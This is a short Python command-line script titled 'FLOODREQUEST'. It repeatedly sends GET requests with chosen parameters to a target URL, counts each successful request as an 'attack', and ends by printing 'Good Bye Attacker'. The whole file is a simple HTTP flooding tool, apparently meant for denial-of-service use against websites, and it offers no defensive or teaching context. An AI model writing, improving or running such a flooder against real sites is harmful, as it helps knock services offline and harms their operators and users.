import argparse
import requests

__author__ = 'mustafauzun0'

'''
FLOODREQUEST
'''

def main():
    parser = argparse.ArgumentParser(description='Flood Request')

    parser.add_argument('-u', '--url', dest='url', help='Target Url', required=True)
    parser.add_argument('-p', '--param', nargs='+', default='', dest='param', help='Request Parameters')
    parser.add_argument('-c', '--count', dest='count', type=int, default=100, help='Request Count')

    args = parser.parse_args()

    if not args.url.startswith(('https://', 'http://')):
        args.url = 'http://' + args.url

    if args.param:
        args.param = '&'.join(args.param)

    attack = 0
    error  = 0
    for _ in range(args.count):
        try:
            request = requests.get(args.url + '?' + args.param)
            attack += 1
        except:
            error  += 1

        print('\rRequest Success: {0}, Request Error: {1}'.format(attack, error), end='', flush=True)
    
    print('\nGood Bye Attacker')    

if __name__ == '__main__':
    main()

